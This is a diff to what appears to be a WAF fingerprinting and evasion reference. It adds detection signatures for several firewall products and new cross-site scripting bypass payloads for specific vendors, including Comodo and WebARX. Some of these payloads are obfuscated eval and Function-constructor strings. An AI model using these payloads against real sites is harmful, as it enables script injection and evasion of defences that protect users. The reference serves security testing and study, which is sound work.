@@ -533,6 +533,20 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Chaitin Safeline
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains <code>event_id</code> keyword within HTML comments.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             ChinaCache
         </td>
         <td>
@@ -1249,6 +1263,35 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            PerimeterX
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains reference to<br> <code>https://www.perimeterx.com/whywasiblocked</code> URL.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Positive Technologies Application Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains <code>Forbidden</code> in <code>h1</code> followed by:</li>
+                    <li><code>Request ID:</code> in format <code>yyyy-mm-dd-hh-mm-ss-{ref. code}</code></li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Profense
         </td>
         <td>
@@ -1418,7 +1461,7 @@ Wanna fingerprint WAFs? Lets see how.
                 <li><b>Detectability: </b>Easy/Moderate</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Response headers may contain:</li>
+                    <li><code>Server</code> header in response may contain:</li>
                     <ul>
                         <li><code>WAF/2.0</code> keyword.</li>
                         <li><code>safedog</code> field value.</li>
@@ -1596,6 +1639,7 @@ Wanna fingerprint WAFs? Lets see how.
                         <li>Image displaying <code>Dell</code> logo.</li>
                         <li><code>This request is blocked by the SonicWALL.</code></li>
                         <li><code>Web Site Blocked</code> text snippet.</li>
+                        <li><code>nsa_banner</code> as keyword. :p</li>
                     </ul>
                 </ul>
             </ul>
@@ -1904,7 +1948,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WebARX
+            WebARX Security Firewall
         </td>
         <td>
             <ul>
@@ -1963,7 +2007,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WebTotem
+            WebTotem Firewall
         </td>
         <td>
             <ul>
@@ -1977,7 +2021,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>    
     <tr>
         <td>
-            West263
+            West263CDN Firewall
         </td>
         <td>
             <ul>
@@ -2012,7 +2056,7 @@ Wanna fingerprint WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            WTS
+            WTS WAF
         </td>
         <td>
             <ul>
@@ -2637,7 +2681,7 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
 - XSS Bypass by [0xInfection](https://twitter.com/0xInfection)
 ```
-<a/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:alert()>clickhere
+<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
 ```
 - [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
 - [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)
@@ -2695,7 +2739,8 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ### Comodo 
 - XSS Bypass by [0xInfection](https://twitter.com/0xinfection)
 ```
-<lol/onauxclick=[2].some(confirm)>rightclickhere
+<input/oninput='new Function`confir\u006d\`0\``'>
+<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
 ```
 - SQLi by [@WAFNinja](https://waf.ninja)
 ```
@@ -2921,6 +2966,12 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 <details ontoggle=alert(1)>
 ```
 
+### WebARX
+- Cross Site Scripting by [@0xInfection](https://twitter.com/0xinfection)
+```
+<a69/onauxclick=open&#40&#41>rightclickhere
+```
+
 ### WebKnight
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
 ```
@@ -3064,6 +3115,7 @@ X-Remote-Addr: 127.0.0.1
 - [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
 - [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com).
 - [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com).
+- [How To Exploit PHP Remotely To Bypass Filters & WAF Rules](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/)- By [@Secjuice](https://secjuice.com)
 - [ModSecurity SQL Injection Challenge: Lessons Learned](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) - By [@SpiderLabs](https://trustwave.com).
 - [XXE that can Bypass WAF](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0) - By [@WallArm](https://labs.wallarm.com).
 - [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) - By [@OWASP](https://owasp.com).
